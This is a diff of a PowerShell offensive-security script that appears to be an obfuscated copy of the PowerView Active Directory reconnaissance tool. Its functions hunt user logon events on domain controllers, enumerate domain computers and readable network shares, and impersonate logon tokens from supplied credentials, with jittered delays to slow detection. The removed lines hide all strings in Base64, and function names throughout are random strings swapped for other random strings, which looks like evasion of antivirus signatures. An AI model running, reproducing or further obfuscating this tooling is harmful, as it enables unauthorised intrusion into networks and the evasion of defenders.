-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
-            $TargetUsers = dfkygh @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
+            Write-Verbose "UserGroupIdentity: $UserGroupIdentity"
+            if ($PSBoundParameters['UserDomain']) { $GroupSearcherArguments['Domain'] = $UserDomain }
+            if ($PSBoundParameters['UserSearchBase']) { $GroupSearcherArguments['SearchBase'] = $UserSearchBase }
+            if ($PSBoundParameters['Server']) { $GroupSearcherArguments['Server'] = $Server }
+            if ($PSBoundParameters['SearchScope']) { $GroupSearcherArguments['SearchScope'] = $SearchScope }
+            if ($PSBoundParameters['ResultPageSize']) { $GroupSearcherArguments['ResultPageSize'] = $ResultPageSize }
+            if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+            if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }
+            if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }
+            $TargetUsers = yimpvw @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
         }
 
         
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l")))]) {
+        if ($PSBoundParameters['ComputerName']) {
             $TargetComputers = $ComputerName
         }
         else {
             
             $DCSearcherArguments = @{
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUA=="))) = $True
+                'LDAP' = $True
             }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $DCSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $DCSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $DCSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckV2ZW50XSBRdWVyeWluZyBmb3IgZG9tYWluIGNvbnRyb2xsZXJzIGluIGRvbWFpbjogJERvbWFpbg==")))
-            $TargetComputers = wrqkwt @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
+            if ($PSBoundParameters['Domain']) { $DCSearcherArguments['Domain'] = $Domain }
+            if ($PSBoundParameters['Server']) { $DCSearcherArguments['Server'] = $Server }
+            if ($PSBoundParameters['Credential']) { $DCSearcherArguments['Credential'] = $Credential }
+            Write-Verbose "[Find-DomainUserEvent] Querying for domain controllers in domain: $Domain"
+            $TargetComputers = fbcyey @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
         }
         if ($TargetComputers -and ($TargetComputers -isnot [System.Array])) {
             $TargetComputers = @(,$TargetComputers)
         }
-        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckV2ZW50XSBUYXJnZXRDb21wdXRlcnMgbGVuZ3RoOiB7MH0="))) -f $($TargetComputers.Length))
-        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckV2ZW50XSBUYXJnZXRDb21wdXRlcnMgJFRhcmdldENvbXB1dGVycw==")))
+        Write-Verbose ("[Find-DomainUserEvent] TargetComputers length: {0}" -f $($TargetComputers.Length))
+        Write-Verbose "[Find-DomainUserEvent] TargetComputers $TargetComputers"
         if ($TargetComputers.Length -eq 0) {
-            throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckV2ZW50XSBObyBob3N0cyBmb3VuZCB0byBlbnVtZXJhdGU=")))
+            throw '[Find-DomainUserEvent] No hosts found to enumerate'
         }
 
         
@@ -10972,30 +10976,30 @@ function mqbqrn {
                 $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                 if ($Up) {
                     $DomainUserEventArgs = @{
-                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) = $TargetComputer
+                        'ComputerName' = $TargetComputer
                     }
-                    if ($StartTime) { $DomainUserEventArgs[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RhcnRUaW1l")))] = $StartTime }
-                    if ($EndTime) { $DomainUserEventArgs[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RW5kVGltZQ==")))] = $EndTime }
-                    if ($MaxEvents) { $DomainUserEventArgs[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWF4RXZlbnRz")))] = $MaxEvents }
-                    if ($Credential) { $DomainUserEventArgs[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+                    if ($StartTime) { $DomainUserEventArgs['StartTime'] = $StartTime }
+                    if ($EndTime) { $DomainUserEventArgs['EndTime'] = $EndTime }
+                    if ($MaxEvents) { $DomainUserEventArgs['MaxEvents'] = $MaxEvents }
+                    if ($Credential) { $DomainUserEventArgs['Credential'] = $Credential }
                     if ($Filter -or $TargetUsers) {
                         if ($TargetUsers) {
-                            sacfjp @DomainUserEventArgs | Where-Object {$TargetUsers -contains $_.TargetUserName}
+                            mzopuk @DomainUserEventArgs | Where-Object {$TargetUsers -contains $_.TargetUserName}
                         }
                         else {
-                            $Operator = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("b3I=")))
+                            $Operator = 'or'
                             $Filter.Keys | ForEach-Object {
-                                if (($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3A=")))) -or ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlcmF0b3I=")))) -or ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlcmF0aW9u"))))) {
-                                    if (($Filter[$_] -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Jg==")))) -or ($Filter[$_] -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YW5k"))))) {
-                                        $Operator = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YW5k")))
+                                if (($_ -eq 'Op') -or ($_ -eq 'Operator') -or ($_ -eq 'Operation')) {
+                                    if (($Filter[$_] -match '&') -or ($Filter[$_] -eq 'and')) {
+                                        $Operator = 'and'
                                     }
                                 }
                             }
-                            $Keys = $Filter.Keys | Where-Object {($_ -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3A=")))) -and ($_ -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlcmF0b3I=")))) -and ($_ -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlcmF0aW9u"))))}
-                            sacfjp @DomainUserEventArgs | ForEach-Object {
-                                if ($Operator -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("b3I=")))) {
+                            $Keys = $Filter.Keys | Where-Object {($_ -ne 'Op') -and ($_ -ne 'Operator') -and ($_ -ne 'Operation')}
+                            mzopuk @DomainUserEventArgs | ForEach-Object {
+                                if ($Operator -eq 'or') {
                                     ForEach ($Key in $Keys) {
-                                        if ($_.([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JEtleQ=="))) -match $Filter[$Key]) {
+                                        if ($_."$Key" -match $Filter[$Key]) {
                                             $_
                                         }
                                     }
@@ -11003,7 +11007,7 @@ function mqbqrn {
                                 else {
                                     
                                     ForEach ($Key in $Keys) {
-                                        if ($_.([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JEtleQ=="))) -notmatch $Filter[$Key]) {
+                                        if ($_."$Key" -notmatch $Filter[$Key]) {
                                             break
                                         }
                                         $_
@@ -11013,7 +11017,7 @@ function mqbqrn {
                         }
                     }
                     else {
-                        sacfjp @DomainUserEventArgs
+                        mzopuk @DomainUserEventArgs
                     }
                 }
             }
@@ -11022,10 +11026,10 @@ function mqbqrn {
 
     PROCESS {
         
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsYXk=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcE9uU3VjY2Vzcw==")))]) {
+        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
 
-            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckV2ZW50XSBUb3RhbCBudW1iZXIgb2YgaG9zdHM6IHswfQ=="))) -f $($TargetComputers.count))
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckV2ZW50XSBEZWxheTogJERlbGF5LCBKaXR0ZXI6ICRKaXR0ZXI=")))
+            Write-Verbose ("[Find-DomainUserEvent] Total number of hosts: {0}" -f $($TargetComputers.count))
+            Write-Verbose "[Find-DomainUserEvent] Delay: $Delay, Jitter: $Jitter"
             $Counter = 0
             $RandNo = New-Object System.Random
 
@@ -11035,37 +11039,37 @@ function mqbqrn {
                 
                 Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
 
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckV2ZW50XSBFbnVtZXJhdGluZyBzZXJ2ZXIgJFRhcmdldENvbXB1dGVyICgkQ291bnRlciBvZiB7MH0p"))) -f $($TargetComputers.count))
+                Write-Verbose ("[Find-DomainUserEvent] Enumerating server $TargetComputer ($Counter of {0})" -f $($TargetComputers.count))
                 $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $StartTime, $EndTime, $MaxEvents, $TargetUsers, $Filter, $Credential
                 $Result
 
                 if ($Result -and $StopOnSuccess) {
-                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckV2ZW50XSBUYXJnZXQgdXNlciBmb3VuZCwgcmV0dXJuaW5nIGVhcmx5")))
+                    Write-Verbose "[Find-DomainUserEvent] Target user found, returning early"
                     return
                 }
             }
         }
         else {
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckV2ZW50XSBVc2luZyB0aHJlYWRpbmcgd2l0aCB0aHJlYWRzOiAkVGhyZWFkcw==")))
+            Write-Verbose "[Find-DomainUserEvent] Using threading with threads: $Threads"
 
             
             $ScriptParams = @{
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RhcnRUaW1l"))) = $StartTime
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RW5kVGltZQ=="))) = $EndTime
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWF4RXZlbnRz"))) = $MaxEvents
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0VXNlcnM="))) = $TargetUsers
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmlsdGVy"))) = $Filter
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA=="))) = $Credential
+                'StartTime' = $StartTime
+                'EndTime' = $EndTime
+                'MaxEvents' = $MaxEvents
+                'TargetUsers' = $TargetUsers
+                'Filter' = $Filter
+                'Credential' = $Credential
             }
 
             
-            payhcg -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
+            umwnhz -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
         }
     }
 }
 
 
-function gyymsv {
+function cposnc {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -11115,7 +11119,7 @@ function gyymsv {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -11148,32 +11152,32 @@ function gyymsv {
     BEGIN {
 
         $ComputerSearcherArguments = @{
-            'Properties' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZG5zaG9zdG5hbWU=")))
+            'Properties' = 'dnshostname'
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJEb21haW4=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $ComputerDomain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJMREFQRmlsdGVy")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $ComputerLDAPFilter }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTZWFyY2hCYXNl")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $ComputerSearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5jb25zdHJhaW5lZA==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5jb25zdHJhaW5lZA==")))] = $Unconstrained }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlcmF0aW5nU3lzdGVt")))] = $OperatingSystem }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTZXJ2aWNlUGFjaw==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZVBhY2s=")))] = $ServicePack }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTaXRlTmFtZQ==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l0ZU5hbWU=")))] = $SiteName }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
+        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
+        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
+        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
+        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
+        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
+        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
+        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }
 
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l")))]) {
+        if ($PSBoundParameters['ComputerName']) {
             $TargetComputers = $ComputerName
         }
         else {
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluU2hhcmVdIFF1ZXJ5aW5nIGNvbXB1dGVycyBpbiB0aGUgZG9tYWlu")))
-            $TargetComputers = aglnim @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
+            Write-Verbose '[Find-DomainShare] Querying computers in the domain'
+            $TargetComputers = auxvef @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
         }
-        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluU2hhcmVdIFRhcmdldENvbXB1dGVycyBsZW5ndGg6IHswfQ=="))) -f $($TargetComputers.Length))
+        Write-Verbose ("[Find-DomainShare] TargetComputers length: {0}" -f $($TargetComputers.Length))
         if ($TargetComputers.Length -eq 0) {
-            throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluU2hhcmVdIE5vIGhvc3RzIGZvdW5kIHRvIGVudW1lcmF0ZQ==")))
+            throw '[Find-DomainShare] No hosts found to enumerate'
         }
 
         
@@ -11182,18 +11186,18 @@ function gyymsv {
 
             if ($TokenHandle) {
                 
-                $Null = jgnbzn -TokenHandle $TokenHandle -Quiet
+                $Null = kckfvi -TokenHandle $TokenHandle -Quiet
             }
 
             ForEach ($TargetComputer in $ComputerName) {
                 $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                 if ($Up) {
                     
-                    $Shares = dmgpvz -ComputerName $TargetComputer
+                    $Shares = otbyom -ComputerName $TargetComputer
                     ForEach ($Share in $Shares) {
                         $ShareName = $Share.Name
                         
-                        $Path = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw=")))+$TargetComputer+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA==")))+$ShareName
+                        $Path = '\\'+$TargetComputer+'\'+$ShareName
 
                         if (($ShareName) -and ($ShareName.trim() -ne '')) {
                             
@@ -11204,7 +11208,7 @@ function gyymsv {
                                     $Share
                                 }
                                 catch {
-                                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgYWNjZXNzaW5nIHNoYXJlIHBhdGggJFBhdGggOiB7MH0="))) -f $_)
+                                    Write-Verbose ("Error accessing share path $Path : {0}" -f $_)
                                 }
                             }
                             else {
@@ -11216,27 +11220,27 @@ function gyymsv {
             }
 
             if ($TokenHandle) {
-                husafk
+                njmybn
             }
         }
 
         $LogonToken = $Null
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsYXk=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcE9uU3VjY2Vzcw==")))]) {
-                $LogonToken = jgnbzn -Credential $Credential
+        if ($PSBoundParameters['Credential']) {
+            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
+                $LogonToken = kckfvi -Credential $Credential
             }
             else {
-                $LogonToken = jgnbzn -Credential $Credential -Quiet
+                $LogonToken = kckfvi -Credential $Credential -Quiet
             }
         }
     }
 
     PROCESS {
         
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsYXk=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcE9uU3VjY2Vzcw==")))]) {
+        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
 
-            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluU2hhcmVdIFRvdGFsIG51bWJlciBvZiBob3N0czogezB9"))) -f $($TargetComputers.count))
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluU2hhcmVdIERlbGF5OiAkRGVsYXksIEppdHRlcjogJEppdHRlcg==")))
+            Write-Verbose ("[Find-DomainShare] Total number of hosts: {0}" -f $($TargetComputers.count))
+            Write-Verbose "[Find-DomainShare] Delay: $Delay, Jitter: $Jitter"
             $Counter = 0
             $RandNo = New-Object System.Random
 
@@ -11246,33 +11250,33 @@ function gyymsv {
                 
                 Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
 
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluU2hhcmVdIEVudW1lcmF0aW5nIHNlcnZlciAkVGFyZ2V0Q29tcHV0ZXIgKCRDb3VudGVyIG9mIHswfSk="))) -f $($TargetComputers.count))
+                Write-Verbose ("[Find-DomainShare] Enumerating server $TargetComputer ($Counter of {0})" -f $($TargetComputers.count))
                 Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $CheckShareAccess, $LogonToken
             }
         }
         else {
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluU2hhcmVdIFVzaW5nIHRocmVhZGluZyB3aXRoIHRocmVhZHM6ICRUaHJlYWRz")))
+            Write-Verbose "[Find-DomainShare] Using threading with threads: $Threads"
 
             
             $ScriptParams = @{
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2hlY2tTaGFyZUFjY2Vzcw=="))) = $CheckShareAccess
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9rZW5IYW5kbGU="))) = $LogonToken
+                'CheckShareAccess' = $CheckShareAccess
+                'TokenHandle' = $LogonToken
             }
 
             
-            payhcg -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
+            umwnhz -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
         }
     }
 
     END {
         if ($LogonToken) {
-            husafk -TokenHandle $LogonToken
+            njmybn -TokenHandle $LogonToken
         }
     }
 }
 
 
-function qhoimi {
+function pewghp {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -11356,7 +11360,7 @@ function qhoimi {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -11388,31 +11392,31 @@ function qhoimi {
 
     BEGIN {
         $ComputerSearcherArguments = @{
-            'Properties' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZG5zaG9zdG5hbWU=")))
+            'Properties' = 'dnshostname'
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJEb21haW4=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $ComputerDomain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJMREFQRmlsdGVy")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $ComputerLDAPFilter }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTZWFyY2hCYXNl")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $ComputerSearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlcmF0aW5nU3lzdGVt")))] = $OperatingSystem }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTZXJ2aWNlUGFjaw==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZVBhY2s=")))] = $ServicePack }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTaXRlTmFtZQ==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l0ZU5hbWU=")))] = $SiteName }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
